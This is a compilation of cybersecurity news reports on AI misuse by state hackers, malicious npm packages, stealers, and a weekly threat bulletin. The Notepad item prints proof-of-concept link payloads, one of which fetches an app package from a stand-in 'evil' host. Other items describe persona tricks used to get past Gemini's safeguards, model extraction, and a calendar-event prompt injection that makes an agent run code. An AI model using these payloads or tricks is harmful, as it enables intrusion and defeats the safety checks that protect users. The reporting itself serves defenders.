Google on Thursday said it observed the North Korea-linked threat actor known as UNC2970 using its generative artificial intelligence (AI) model Gemini to conduct reconnaissance on its targets, as various hacking groups continue to weaponize the tool for accelerating various phases of the cyber attack life cycle, enabling information operations, and even conducting model extraction attacks.

"The group used Gemini to synthesize OSINT and profile high-value targets to support campaign planning and reconnaissance," Google Threat Intelligence Group (GTIG) said in a report shared with The Hacker News. "This actor's target profiling included searching for information on major cybersecurity and defense companies and mapping specific technical job roles and salary information."

The tech giant's threat intelligence team characterized this activity as a blurring of boundaries between what constitutes routine professional research and malicious reconnaissance, allowing the state-backed actor to craft tailored phishing personas and identify soft targets for initial compromise.

UNC2970 is the moniker assigned to a North Korean hacking group that overlaps with a cluster that's tracked as Lazarus Group, Diamond Sleet, and Hidden Cobra. It's best known for orchestrating a long-running campaign codenamed Operation Dream Job to target aerospace, defense, and energy sectors with malware under the guise of approaching victims under the pretext of job openings.

GTIG said UNC2970 has "consistently" focused on defense targeting and impersonating corporate recruiters in their campaigns, with the target profiling including searches for "information on major cybersecurity and defense companies and mapping specific technical job roles and salary information."

UNC2970 is far from the only threat actor to have misused Gemini to augment their capabilities and move from initial reconnaissance to active targeting at a faster clip. Some of the other hacking crews that have integrated the tool into their workflows are as follows -

UNC6418 (Unattributed), to conduct targeted intelligence gathering, specifically seeking out sensitive account credentials and email addresses.

Temp.HEX or Mustang Panda (China), to compile a dossier on specific individuals, including targets in Pakistan, and to gather operational and structural data on separatist organizations in various countries.

APT31 or Judgement Panda (China), to automate the analysis of vulnerabilities and generate targeted testing plans by claiming to be a security researcher.

APT41 (China), to extract explanations from open-source tool README.md pages, as well as troubleshoot and debug exploit code.

UNC795 (China), to troubleshoot their code, conduct research, and develop web shells and scanners for PHP web servers.

APT42 (Iran), to facilitate reconnaissance and targeted social engineering by crafting personas that induce engagement from the targets, as well as develop a Python-based Google Maps scraper, develop a SIM card management system in Rust, and research the use of a proof-of-concept (PoC) for a WinRAR flaw (CVE-2025-8088).

One recurring avenue for abuse of generative AI models like Gemini occurs when threat actors reframe their prompts by identifying themselves as a security researcher or a participant in a capture-the-flag (CTF) exercise to trick the system into generating unexpected responses. Steve Miller, AI threat lead at GTIG, told The Hacker News that the company is constantly improving its safety mechanisms to combat such scenarios.

"Google is always working to improve our safety systems, including detection classifiers, mitigations and other safeguards to prevent misuse by threat actors," Miller said. "As adversaries experience friction in misusing our systems, they begin to experiment with new ways to bypass the safeguards – and though we see lots of these experiments, they are not always successful. Gemini is getting better at recognizing persona-based tricks and responding safely. As we observe new threat activity, we work to strengthen those guard rails."

Google also said it detected a malware called HONESTCUE that leverages Gemini's API to outsource functionality generation for the next-stage, along with an AI-generated phishing kit codenamed COINBAIT that's built using Lovable AI and masquerades as a cryptocurrency exchange for credential harvesting. Some aspects of COINBAIT-related activity have been attributed to a financially motivated threat cluster dubbed UNC5356.

"HONESTCUE is a downloader and launcher framework that sends a prompt via Google Gemini's API and receives C# source code as the response," it said. "However, rather than leveraging an LLM to update itself, HONESTCUE calls the Gemini API to generate code that operates the 'stage two' functionality, which downloads and executes another piece of malware."

The fileless secondary stage of HONESTCUE then takes the generated C# source code received from the Gemini API and uses the legitimate .NET CSharpCodeProvider framework to compile and execute the payload directly in memory, thereby leaving no artifacts on disk.

Google has also called attention to a recent wave of ClickFix campaigns that leverage the public sharing feature of generative AI services to host realistic-looking instructions to fix a common computer issue and ultimately deliver information-stealing malware. The activity was flagged in December 2025 by Huntress.

Lastly, the company said it identified and disrupted model extraction attacks that are aimed at systematically querying a proprietary machine learning model to extract information and build a substitute model that mirrors the target's behavior. In a large-scale attack of this kind, Gemini was targeted by over 100,000 prompts that posed a series of questions aimed at replicating the model's reasoning ability across a broad range of tasks in non-English languages.

Last month, Praetorian devised a PoC extraction attack where a replica model achieved an accuracy rate of 80.1% simply by sending a series of 1,000 queries to the victim's API and recording the outputs and training it for 20 epochs.

"Many organizations assume that keeping model weights private is sufficient protection," security researcher Farida Shafik said. "But this creates a false sense of security. In reality, behavior is the model. Every query-response pair is a training example for a replica. The model’s behavior is exposed through every API response."

Google, which launched the AI Cyber Defense Initiative in 2024, has noted that AI offers the best opportunity to reverse the Defender's Dilemma and tilt the cybersecurity scales in favor of defenders.

"Everyone is looking to increase productivity with automation. Adversaries are increasingly seeing value from AI," Miller said. "They are using AI routinely and they are building capabilities with it, so it is easy to predict that we will see an increase in the quality, quantity and speed of AI-enabled attacks. Defenders need to prepare for the future and make similar investments in AI, and build towards AI-enabled defensive capabilities that can operate at machine speed."

(The story was updated after publication to include responses from GTIG.)

[2] The Hacker News - Lazarus Campaign Plants Malicious Packages in npm and PyPI Ecosystems
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 22:25:00 +0530

Cybersecurity researchers have discovered a fresh set of malicious packages across npm and the Python Package Index (PyPI) repository linked to a fake recruitment-themed campaign orchestrated by the North Korea-linked Lazarus Group.

The coordinated campaign has been codenamed graphalgo in reference to the first package published in the npm registry. It's assessed to be active since May 2025.

"Developers are approached via social platforms like LinkedIn and Facebook, or through job offerings on forums like Reddit," ReversingLabs researcher Karlo Zanki said in a report. "The campaign includes a well-orchestrated story around a company involved in blockchain and cryptocurrency exchanges."

Notably, one of the identified npm packages, bigmathutils, attracted more than 10,000 downloads after the first, non-malicious version was published, and before the second version containing a malicious payload was released. The names of the packages are listed below -

As with many job-focused campaigns conducted by North Korean threat actors, the attack chain begins with establishing a fake company like Veltrix Capital in the blockchain and cryptocurrency trading space, and then setting up the necessary digital real estate to create an illusion of legitimacy.

This includes registering a domain and creating a related GitHub organization to host several repositories for use in coding assessments. The repositories have been found to contain projects based on Python and JavaScript.

"Examination of these repositories didn't reveal any obvious malicious functionality," Zanki said. "That is because the malicious functionality was not introduced directly via the job interview repositories, but indirectly – through dependencies hosted on the npm and PyPI open-source package repositories."

The idea behind setting up these repositories is to trick candidates who apply to its job listings on Reddit and Facebook Groups into running the projects on their machines, effectively installing the malicious dependency and triggering the infection. In some cases, victims are directly contacted by seemingly legitimate recruiters on LinkedIn.

The packages ultimately act as a conduit to deploy a remote access trojan (RAT) that periodically fetches and executes commands from an external server. It supports various commands to gather system information, enumerate files and directories, list running processes, create folders, rename files, delete files, and upload/download files.

Interestingly, the command-and-control (C2) communication is protected by a token-based mechanism to ensure that only requests with a valid token are accepted. The approach was previously observed in 2023 campaigns linked to a North Korean hacking group called Jade Sleet, which is also known as TraderTraitor or UNC4899.

It essentially works like this: the packages send system data as part of a registration step to the C2 server, which responds with a token. This token is then sent back to the C2 server in subsequent requests to establish that they are originating from an already registered infected system.

"The token-based approach is a similarity [...] in both cases and has not been used by other actors in malware hosted on public package repositories as far as we know," Zanki told The Hacker News at that time.

The findings show that North Korean state-sponsored threat actors continue to poison open-source ecosystems with malicious packages in hopes of stealing sensitive data and conducting financial theft, a fact evidenced by the RAT's checks to determine if the MetaMask browser extension is installed in the machine.

"Evidence suggests that this is a highly sophisticated campaign," ReversingLabs said. "Its modularity, long-lived nature, patience in building trust across different campaign elements, and the complexity of the multilayered and encrypted malware point to the work of a state-sponsored threat actor."

More Malicious npm Packages Found

The disclosure comes as JFrog uncovered a sophisticated, malicious npm package called "duer-js" published by a user named "luizaearlyx." While the library claims to be a utility to "make the console window more visible," it harbors a Windows information stealer called Bada Stealer.

"In addition to stealing information from the host it infected, the malicious package downloads a secondary payload," security researcher Guy Korolevski said. "This payload is designed to run on the Discord Desktop app startup, with self-updating capabilities, stealing directly from it, including payment methods used by the user."

It also coincides with the discovery of another malware campaign that weaponizes npm to extort cryptocurrency payments from developers during package installation using the "npm install" command. The campaign, first recorded on February 4, 2026, has been dubbed XPACK ATTACK by OpenSourceMalware.

The names of the packages, all uploaded by a user named "dev.chandra_bose," are listed below -

xpack-video-submission

xpack-subscription-test

testing-package-xdsfdsfsc

"Unlike traditional malware that steals credentials or executes reverse shells, this attack innovatively abuses the HTTP 402 'Payment Required' status code to create a seemingly legitimate payment wall," security researcher Paul McCarty said. "The attack blocks installation until victims pay 0.1 USDC/ETH to the attacker's wallet, while collecting GitHub usernames and device fingerprints."

"If they refuse to pay, the installation simply fails after wasting 5+ minutes of their development time, and they may not even realize they've encountered malware versus what appeared to be a legitimate paywall for package access."

Threat activity this week shows one consistent signal — attackers are leaning harder on what already works. Instead of flashy new exploits, many operations are built around quiet misuse of trusted tools, familiar workflows, and overlooked exposures that sit in plain sight.

Another shift is how access is gained versus how it’s used. Initial entry points are getting simpler, while post-compromise activity is becoming more deliberate, structured, and persistent. The objective is less about disruption and more about staying embedded long enough to extract value.

There’s also growing overlap between cybercrime, espionage tradecraft, and opportunistic intrusion. Techniques are bleeding across groups, making attribution harder and defense baselines less reliable.

Below is this week’s ThreatsDay Bulletin — a tight scan of the signals that matter, distilled into quick reads. Each item adds context to where threat pressure is building next.

Notepad RCE via Markdown Links

Microsoft Patches Notepad Flaw


      Microsoft has patched a command injection flaw (CVE-2026-20841, CVSS score: 8.8) in its Notepad app that could result in remote code execution. "Improper neutralization of special elements used in a command ('command injection') in Windows Notepad App allows an unauthorized attacker to execute code over a network," Microsoft said. An attacker could exploit this flaw by tricking a user into clicking a malicious link inside a Markdown file opened in Notepad, causing the application to run remote files. "The malicious code would execute in the security context of the user who opened the Markdown file, giving the attacker the same permissions as that user," the tech giant added. Proof-of-concept (PoC) exploits show that the vulnerability can be triggered by creating a Markdown file with "file://" links that point to executable files ("file://C:/windows/system32/cmd.exe") or contain special URIs ("ms-appinstaller://?source=https://evil/xxx.appx") to run arbitrary payloads. The issue was fixed as part of its monthly Patch Tuesday update this week. Microsoft added Markdown support to Notepad on Windows 11 last May.

APT Pressure Intensifies on Taiwan

Taiwan Becomes Target of APT Attacks


      TeamT5 said tracked more than 510 advanced persistent threat (APT) operations affecting 67 countries globally in 2025, out of which 173 attacks targeted Taiwan. "Taiwan’s role in geopolitical tensions and values in the global technology supply chain makes it uniquely vulnerable for adversaries who seek intelligence or long-term access to achieve political and military objectives," the security vendor said. "Taiwan is more than just a target – it functions as a proving ground where China-nexus APTs test and refine their tactics before scaling them to other environments."

Node.js Stealer Hits Windows

LTX Stealer Targets Windows Systems


      A new Node.js information stealer named LTX Stealer has been spotted in the wild. Targeting Windows systems and distributed via a heavily obfuscated Inno Setup installer, the malware conducts large-scale credential harvesting from Chromium-based browsers, targets cryptocurrency-related artifacts, and stages the collected data for exfiltration. "The campaign relies on a cloud-backed management infrastructure, where Supabase is used exclusively as the authentication and access-control layer for the operator panel, while Cloudflare is leveraged to front backend services and mask infrastructure details," CYFIRMA said.

Marco Stealer Expands Data Theft

Marco Stealer Emerges in the Wild


      Another new Windows-oriented information stealer is Marco Stealer, which was first observed in June 2025. Delivered via a downloader in a ZIP archive, it mainly targets browser data, cryptocurrency wallet information, files from popular cloud services like Dropbox and Google Drive, and other sensitive files stored on the victim's system. "Marco Stealer relies on encrypted strings that are decrypted only at runtime to avoid static analysis. In addition, the information stealer uses Windows APIs to detect anti-analysis tools like Wireshark, x64dbg, and Process Hacker," Zscaler ThreatLabz said. "Stolen data is encrypted using AES-256 before being sent to C2 servers via HTTP POST requests."

Telegram Sessions Hijacked via OAuth Abuse

Social Engineering Campaign Targets Telegram Accounts


      A new account takeover campaign has been observed abusing Telegram's native authentication workflows to obtain fully authorized user sessions. In one variant, victims are prompted to scan a QR code on bogus sites using the Telegram mobile application, initiating a legitimate Telegram login attempt tied to attacker-controlled API credentials. Telegram then sends an in-app authorization prompt to the victim's existing session. Alternatively, users can also enter their country code, phone number, and verification code (if enabled) on a fake web page, which causes the data to be relayed to Telegram's official authentication APIs. Upon successful verification, Telegram issues an in-app authorization request as before. "Unlike traditional phishing attacks that rely solely on credential harvesting or token replay, this campaign leverages attacker-controlled Telegram API credentials and integrates directly with Telegram's legitimate login and authorization infrastructure," CYFIRMA noted. "By inducing victims to approve in-app authorization prompts under false pretenses, the attackers achieve complete session compromise while minimizing technical anomalies and user suspicion."

Discord Expands Global Age Checks

Discord Announces Age Verification Plans


      Discord has announced it will require all users globally to verify their ages by sharing video selfies or providing government IDs to access certain content. Additionally, it will implement an age inference model, a new system that runs in the background to help determine whether an account belongs to an adult, without always requiring users to verify their age. The company has assured that video selfies don't leave a user's device, that identity documents submitted to third-party vendors, in this case k-ID, are "deleted quickly" or "immediately" after age confirmation, and that a user's age verification status cannot be seen by other users. However, concerns have been raised about whether Discord can be trusted with their most sensitive information, especially in the aftermath of a security breach of a third-party service that Discord previously relied on to verify ages in the U.K. and Australia. The incident led to the theft of government IDs of 70,000 Discord users. In a statement given to Ars Technica, k-ID said the age estimation technology runs entirely on device and no third-parties store personal data shared during age checks. The move comes at a time when laws requiring age verification on social media platforms are being adopted across the world. Discord confirmed that "a phased global rollout" would begin in "early March," at which point all users globally would be defaulted to “teen-appropriate" experiences.

GuLoader Refines Evasion Tradecraft

GuLoader Continues to Evolve


      A new analysis of the GuLoader malware has revealed that it employs polymorphic code to dynamically construct constants during execution and exception-based control flow obfuscation to conceal its functionality and evade detection. Besides introducing sophisticated exception-handling mechanisms to complicate analysis, the malware attempts to bypass reputation-based rules by hosting payloads on trusted cloud services such as Google Drive and OneDrive. First observed in December 2019, GuLoader serves primarily as a downloader for Remote Access Trojans (RATs) and information stealers.

$73.6M Pig-Butchering Scam Sentence

Man Sentenced to 20 Years in Prison for Crypto Scam


      Daren Li, 42, a dual national of China and St. Kitts and Nevis has been sentenced in absentia in the U.S. to the statutory maximum of 20 years in prison and three years of supervised release for his international cryptocurrency investment scheme known as pig butchering or romance baiting that defrauded victims of more than $73.6 million. Li pleaded guilty to his crime in November 2024. However, the defendant cut off his ankle monitor and fled the country in December 2025. His present whereabouts are unknown. "As part of his plea agreement, Li admitted that unindicted members of the conspiracy would contact victims directly through unsolicited social-media interactions, telephone calls and messages, and online dating services," the U.S. Justice Department said. "The unindicted co-conspirators would gain the trust of victims by establishing either professional or romantic relationships with them, often communicating by electronic messages sent via end-to-end encrypted applications." The co-conspirators established spoofed domains and websites that resembled legitimate cryptocurrency trading platforms and tricked victims into investing in cryptocurrency through these fraudulent platforms after gaining their trust. Li also confessed that he would direct co-conspirators to open U.S. bank accounts established on behalf of 74 shell companies and would monitor the receipt of interstate and international wire transfers of victim funds. "Li and other co-conspirators would receive victim funds in financial accounts that they controlled and then monitor the conversion of victim funds to virtual currency," the department said.

0-Click AI Prompt RCE Risk

0-Click Flaw in Claude Desktop Extensions


      A zero-click remote code execution vulnerability (CVSS score: 10.0) in Claude Desktop Extensions (DXT) could be exploited to silently compromise a system by a simple Google Calendar event when a user issues a harmless prompt like "Please check my latest events in google cal[endar] and then take care of it for me." The problem stems from how MCP-based systems like Claude DXT autonomously chain together different tools and external connectors to fulfil user requests without enforcing proper security boundaries. The phrase "take care of it" does the heavy lifting here, as the artificial intelligence (AI) assistant interprets it as a justification to execute arbitrary instructions embedded in those events without seeking users' permission. The flaw impacts more than 10,000 active users and 50 DXT extensions, according to LayerX. "Unlike traditional browser extensions, Claude Desktop Extensions run unsandboxed with full system privileges," the browser security company said. "As a result, Claude can autonomously chain low-risk connectors (e.g., Google Calendar) to high-risk local executors, without user awareness or consent. If exploited by a bad actor, even a benign prompt ('take care of it'), coupled with a maliciously worded calendar event, is sufficient to trigger arbitrary local code execution that compromises the entire system." Anthropic has opted not to fix the issue at this time. A similar Google Gemini prompt injection flaw was disclosed by Miggo Security last month.

Data-Theft Ransomware Surges

Coinbase Cartel Claims Over 60 Victims


      A nascent ransomware group called Coinbase Cartel has claimed more than 60 victims since it first emerged in September 2025. "Coinbase Cartel operations are marked by an insistence on stealing data while leaving systems available rather than complementing data theft with the use of encryptors that prohibit system access," Bitdefender said. The healthcare, technology, and transportation industries represent a major chunk of Coinbase Cartel's greatest victim demographic to date. The healthcare organizations impacted by the threat actor are primarily based in the U.A.E. Some of the other prominent groups that are focused on only data theft are World Leaks and PEAR (Pure Extraction and Ransom). The development paints a picture of an ever-evolving ransomware landscape populated by new and old actors, even as the threat is getting increasingly professionalized as attackers streamline operations. According to data from Cyble, 6,604 ransomware attacks were recorded in 2025, up 52% from the 4,346 attacks claimed by ransomware groups in 2024.

Google Adds New Options "Results about you" 


      Google has expanded its "Results about you" tool to give users more control over sensitive personal information and added a way to request removal of non-consensual explicit images from search results, as well as other details like driver's license numbers, passport numbers, and Social Security numbers. "We understand that removing existing content is only part of the solution," Google said. "For added protection, the new process allows you to opt in to safeguards that will proactively filter out any additional explicit results that might appear in similar searches."

Monitoring Tools Used for Ransomware

Crazy Ransomware Gang Abuses Net Monitor and SimpleHelp 


      Threat actors have been observed leveraging Net Monitor, a commercial workforce monitoring tool, with SimpleHelp, a legitimate remote monitoring and management (RMM) platform, as part of attacks designed to deploy Crazy ransomware. The two incidents, believed to be the work of the same threat actor, took place in January and February 2026. Net Monitor comes with various capabilities that go beyond employee productivity tracking, including reverse shell connections, remote desktop control, file management, and the ability to customize service and process names during installation. These features, coupled with SimpleHelp's remote access functionality, make them attractive tools for attackers looking to blend into enterprise environments without deploying traditional malware. What's more, Net Monitor for Employees Professional bundles a pseudo-terminal ("winpty-agent.exe") that facilitates full command execution. Bad actors have been found to leverage this aspect to conduct reconnaissance, deliver additional payloads, and deploy secondary remote access channels, turning it into a functional remote access trojan. "In the cases observed, threat actors used these two tools together, using Net Monitor for Employees as a primary remote access channel and SimpleHelp as a redundant persistence layer, ultimately leading to the attempted deployment of Crazy ransomware," Huntress said.

0APT Victim Claims Questioned

0APT's 200 Victim Count Likely a Hoax


      A threat actor called 0APT appears to be falsely claiming that it has breached over 200 victims within a span of a week since launching their data leak site on January 28, 2026. Further analysis has determined that the victims are a blend of wholly fabricated generic company names and recognizable organizations that threat actors have not breached, GuidePoint's Research and Intelligence Team said. The data leak site went offline on February 8, 2026, before resurfacing the next day with a list of more than 15 very large multinational organizations. "0APT is likely operating in this deceptive manner in order to support extortion of uninformed victims, re-extortion of historical victims from other groups, defrauding of potential affiliates, or to garner interest in a nascent RaaS group," security researcher Jason Baker noted. While signs suggest that the group may be bluffing about its victim count, the Windows and Linux ransomware samples have been found to be fully operational, per Halcyon. It's worth pointing out that ransomware groups like RansomedVC have listed fabricated attacks on their data leak sites to deceive victims. Viewed in that light, 0APT's exaggerated claims are likely an attempt to gain visibility and momentum among its peers. Its origins remain unknown.

SYSTEM RCE via Named Pipe

Flaw in Quest Desktop Authority Detailed


      A high-risk security vulnerability (CVE-2025-67813, CVSS score: 5.3) within Quest Desktop Authority could allow attackers to execute remote code with SYSTEM privileges. "Quest KACE Desktop Authority exposes a named pipe (ScriptLogic_Server_NamedPipe_9300) running as SYSTEM that accepts connections from any authenticated domain user over the network," NetSPI said. The named pipe implements a custom IPC protocol that supports dangerous operations, including arbitrary command execution, DLL injection, credential retrieval, and COM object invocation. Any authenticated user on the network can achieve remote code execution as a local administrator on hosts running the Desktop Authority agent.

AI Traffic Scans to Block VPNs

Russia to Analyze Internet Traffic Using AI to Flag VPN Usage


      Russia's internet watchdog will use artificial intelligence (AI) technology to analyze internet traffic and restrict the operation of VPN services, Forbes Russia reported. The Roskomnadzor is expected to spend close to $30 million to develop the internet traffic filtering mechanism this year. The Russian government has blocked access to tens of VPN apps in recent years. It also maintains a registry of banned websites.

Mispadu Expands Banking Attacks

Mexico and Brazil Targeted by Mispadu Trojan


      Cofense said it has observed Mispadu campaigns targeting Latin America, particularly Mexico and Brazil, and to a lesser extent in Spain, Italy, and Portugal, with phishing emails containing HTML Application (HTA) attachments that are designed to bypass Secure Email Gateways (SEGs) to reach the inboxes of employees across the world. "The only variation is that sometimes the URL delivering the HTA files is embedded in an attached, password-protected PDF rather than embedded in the email itself," Cofense said. "In all recent campaigns, Mispadu makes use of an AutoIT loader and various legitimate files to run the malicious content. Each step of the delivery chain from the attached PDF to the AutoIT script is dynamically generated. This means that every hash except for the AutoIT compiler is unique to each install, further frustrating EDR." Recent iterations of the banking trojan come with the ability to self-propagate on infected hosts via email and expand the target online banking websites to include banks outside of Latin America as well as cryptocurrency-based exchanges.

ScreenConnect Deployed via Phish

Phishing Campaign Delivers ConnectWise ScreenConnect for Remote Access


      In a phishing campaign documented by Forcepoint, spoofed emails have been found to deliver a malicious .cmd attachment that escalates privileges, disables Windows SmartScreen, removes the mark-of-the-web (MotW) to bypass security warnings, and ultimately installs ConnectWise ScreenConnect. The campaign has targeted organizations across the U.S., Canada, the U.K., and Northern Ireland, focusing on sectors with high-value data, including government, healthcare, and logistics companies. Recent phishing attacks have also abused web services from Amazon, like Simple Storage Service (S3) buckets, Amazon Simple Email Service (SES), and Amazon Web Services (AWS) Amplify to slip past email security controls and launch credential phishing attacks. Other phishing attacks have embraced uncommon techniques like using edited versions of legitimate business emails to deliver convincingly spoofed emails to recipients. "These emails work by having the threat actor create an account on a legitimate service and input arbitrary text into a field that will later be included in outgoing emails," Cofense said. "After this is done, the threat actor would need to receive a legitimate email that happens to include the malicious text that was created by the threat actor. Once the email is received, the threat actor can then redirect the email to the intended victims."

CrashFix Delivers SystemBC

CrashFix Variant Attack Delivers Python Implants and SystemBC 


      A variant of the ClickFix attack called CrashFix has been used to deliver malicious payloads consistent with a known malware called SystemBC. Unlike the CrashFix-style social engineering flow documented by Huntress and Microsoft, the attack stands out because it did not involve the use of a malicious browser extension. "Instead, the victim was convinced to execute a command via the Windows Run dialog (Win+R) as seen with traditional ClickFix," Binary Defense said. "This command abused a legitimate Windows binary – finger.exe – copied from System32, renamed, and executed from a user-writable directory. The output of this execution was piped directly into cmd.exe, acting as a delivery mechanism for an obfuscated PowerShell payload." The PowerShell code then retrieves follow-on content, including Python backdoors and a DLL implant that overlaps with SystemBC, from attacker-controlled infrastructure, while taking steps to fingerprint the host and clean up artifacts on disk. "The coexistence of Python backdoors and a reflective DLL implant highlights a deliberate defense-evasion and persistence strategy," the company said. "By mixing scripting-based and native implants, the attacker reduced reliance on any single execution method, making complete eviction more difficult."

Bing Ads Funnel Tech Scams

Fake Bing Ads Lead to Tech Support Scams


      Malicious ads served on Bing search results when searching for sites like Amazon are being used to redirect unsuspecting users to tech support scam links hosted in Azure Blob Storage. The campaign targeted healthcare, manufacturing, and technology sectors in the U.S. "Clicking on the malicious ad sent the victims to highswit[.]space, a newly registered domain hosting an empty WordPress site, which then redirected them to one of the Azure Blob Storage containers, which served a typical tech support scam site," Netskope Threat Labs said.

Chinese VPN Infra Footprint Expands

Chinese VPN Used by Devices in Russia, China, Myanmar, Iran, and Venezuela


      A Chinese virtual private network (VPN) provider named LVCHA VPN has been used by devices in Russia, China, Myanmar, Iran, and Venezuela. It also has an Android app that's directly hosted on its website ("lvcha[.]in") and distributed via the Google Play Store. Further analysis of the domain has uncovered a cluster of nearly 50 suspicious domains, all of which promote the same VPN. "Whenever we see campaigns promoting suspicious downloads or products using so many domains, it can indicate that the operator is rotating domains to work around country-level firewalls in regions where they’re trying to promote distribution," Silent Push said.

Grid Attack Triggers Western Alerts

U.K. and U.S. Issue Warning After Poland Energy Grid Cyber Attack


      Following a late December 2025 coordinated cyber attack on Poland's power grid, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) has published a bulletin for critical infrastructure owners and operators. CISA said vulnerable edge devices remain a prime target for threat actors, OT devices without firmware verification can be permanently damaged, and threat actors leverage default credentials to pivot onto the HMI and RTUs. "Operators should prioritize updates that allow firmware verification when available," the agency added. "Operators should immediately change default passwords and establish requirements for integrators or OT suppliers to enforce password changes in the future." In a similar development, Jonathan Ellison, director for national resilience at the National Cyber Security Centre (NCSC), has urged critical infrastructure operators in the country to act now and have incident response plans or playbooks in place to respond to such threats. "Although attacks can still happen, strong resilience and recovery plans reduce both the chances of an attack succeeding and the impact if one does," Ellison said.

Telnet Traffic Abruptly Collapses

Global Telnet Traffic Dropped in Mid-January 2026 


      Threat intelligence firm GreyNoise said it observed a steep decline in global Telnet traffic on January 14, 2026, six days before a security advisory for CVE-2026-24061 went public on January 20. CVE-2026-24061 relates to a critical vulnerability in the GNU InetUtils telnet daemon that could result in an authentication bypass. Data gathered by GreyNoise shows that the hourly volume of Telnet sessions dropped 65% on January 14 at 21:00 UTC, then fell 83% within two hours. Daily sessions have declined from an average of 914,000 (from December 1, 2025, to January 14, 2026) to around 373,000, equating to a 59% reduction that has persisted as of February 10, 2026. "Eighteen ASNs with significant pre-drop telnet volume (>50K sessions each) went to absolute zero after January 15," the company said. "Five entire countries vanished from GreyNoise telnet data: Zimbabwe, Ukraine, Canada, Poland, and Egypt. Not reduced to zero." Among the 18 ASNs included were British Telecom, Charter/Spectrum, Cox Communications, and Vultr. Although correlation does not imply causation, GreyNoise has raised the possibility that the telecom operators likely received advance warning about CVE-2026-24061, allowing them to act on it at the infrastructure level. "A backbone or transit provider — possibly responding to a coordinated request, possibly acting on their own assessment — implemented port 23 filtering [to block telnet traffic] on transit links," it said.

New Loaders Fuel Stealer Campaigns

New RenEngine and Foxveil Malware Loaders Spotted 


      Cyderes and Cato Networks have detailed new previously undocumented malware loaders dubbed RenEngine Loader and Foxveil that have been used to deliver next-stage payloads. The Foxveil malware campaign has been active since August 2025. It's engineered to establish an initial foothold, complicate analysis efforts, and retrieve next-stage shellcode payloads from threat actor-controlled staging hosted on trusted platforms like Cloudflare Pages, Netlify, and Discord. Attacks leveraging RenEngine Loader, on the other hand, have employed illegally modified game installers distributed via piracy platforms to deliver the malware alongside the playable content. More than 400,000 global victims are estimated to have been impacted, with most of them located in India, the U.S., and Brazil. The activity has been operational since April 2025. "RenEngine Loader decrypts, stages, and transfers execution to Hijack Loader, enabling rapid tooling evolution and flexible capability deployment," Cyderes said. "By embedding a modular, stealth-focused second-stage loader inside a legitimate Ren’Py launcher, the attackers closely mimic normal application behavior, significantly reducing early detection." The end goal of the attack is to deploy an information stealer called ACR Stealer.

Looker RCE Chain Disclosed

Flaws in Google Looker 


      Two novel security vulnerabilities have been disclosed in Google Looker that could be exploited by an attacker to fully compromise a Looker instance. This includes a remote code execution (RCE) chain via Git hook overrides and an authorization bypass flaw via internal database connection abuse. Successful exploitation of the flaws could allow an attacker to run arbitrary code on the Looker server, potentially leading to cross-tenant access, as well as exfiltrate the full internal MySQL database via error-based SQL injection, according to Tenable. "The vulnerabilities allowed users with developer permissions in Looker to access both the underlying system hosting Looker, and its internal database," Google said. Collectively tracked as CVE-2025-12743, aka LookOut (CVSS score: 6.5), they were patched by Google in September 2025. While the fixes have been applied to cloud instances, users of self-hosted Looker instances are advised to update to the latest supported version.

Trojanized 7-Zip Spreads Proxyware

Malicious 7-Zip Site Distributes Fake Installer with Proxy 


      A fake installer for the 7-Zip file archiver tool downloaded from 7zip[.]com (the legitimate domain is 7-zip[.]org) is being used to drop a proxy component that enrolls the infected host into a residential proxy node. This allows third parties to route traffic through the victim's IP address while concealing their own origins. The installer is digitally signed with a now-revoked certificate originally issued to Jozeal Network Technology Co., Limited. The campaign has been codenamed upStage Proxy by security researcher Luke Acha, who discovered it late last month. "The operators behind 7zip[.]com distributed a trojanized installer via a lookalike domain, delivering a functional copy of 7-Zip File Manager alongside a concealed malware payload," Malwarebytes said. The 7-Zip lure appears to be part of a broader effort that uses trojanized installers for HolaVPN, TikTok, WhatsApp, and Wire VPN. Attack chains involve using YouTube tutorials as a malware distribution vector to direct unsuspecting users to the bogus site, once again highlighting the abuse of trusted platforms.

AI-Built VoidLink Expands Reach

More Details About VoidLink Emerge


VoidLink is a sophisticated Linux-based command-and-control (C2) framework capable of long-term intrusion across cloud and enterprise environments. First documented by Check Point last month, ongoing analyses of the malware have revealed that it may have been developed by a Chinese-speaking developer using an artificial intelligence (AI) model with limited human review. Ontinue, in a report published this week, said it found "strong indicators" that the implant was built using a large language model (LLM) coding agent. "It fingerprints cloud environments across AWS, GCP, Azure, Alibaba Cloud, and Tencent Cloud, harvesting credentials from environment variables, config directories, and instance metadata APIs," security researcher Rhys Downing said. "It detects container runtimes and includes plugins for container escape and Kubernetes privilege escalation. A kernel-level rootkit adapts its stealth approach based on the host's kernel version." Cisco Talos said it has observed the modular framework in campaigns undertaken by a new threat actor codenamed UAT-9921, which is believed to have been active since 2019. The cybersecurity company said it also found "clear indications" of a Windows equivalent of VoidLink that comes with the ability to load plugins. "UAT-9921 uses compromised hosts to install VoidLink command and control (C2), which are then used to launch scanning activities both internal and external to the network," Talos researchers said.

Taken together, these developments show how threat actors are balancing speed with patience — moving fast where defenses are weak, and slowing down where stealth matters more than impact. The result is activity that blends into normal operations until damage is already underway.

For defenders, the challenge isn’t just blocking entry anymore. It’s recognizing misuse of legitimate access, spotting abnormal behavior inside trusted systems, and closing gaps that don’t look dangerous on the surface.

The briefs that follow aren’t isolated incidents. They’re fragments of a wider operating picture — one that keeps evolving week after week.

[TAM METİN - 436 kelime]
The Russian government is trying to block WhatsApp in the country as its crackdown on communication platforms outside its control intensifies.

WhatsApp announced the action against it on X, calling it “a backwards step” that “can only lead to less safety for people in Russia.”

WhatsApp assured its Russian users that it will continue doing everything it can to keep them connected.

According to Russian media, the country’s internet watchdog, Roskomnadzor, had recently excluded the domains whatsapp.com and web.whatsapp.com from the National Domain Name System, citing the official explanation of countering crime and fraud.

In practice, excluding the domains from domestic DNS routing made WhatsApp services accessible only to users who use VPN tools or external resolvers.

However, more aggressive measures are reportedly now in place, with the latest attempt to fully block WhatsApp in Russia. The instant messenger's parent company, Meta, has been designated as an “extremist” entity in Russia since 2022.

WhatsApp saw its first restrictions in the country in August 2025, when Roskomnadzor began throttling voice and video calls. In October 2025, the authorities attempted to block new user registrations.

Presidential press secretary Dmitry Peskov reportedly stated that the authorities are open to allowing WhatsApp to resume operations in the country, provided that Meta complies with local legislation.

WhatsApp blocks came shortly after similar action was taken against Telegram, which was reportedly aggressively throttled earlier this week in Russia.

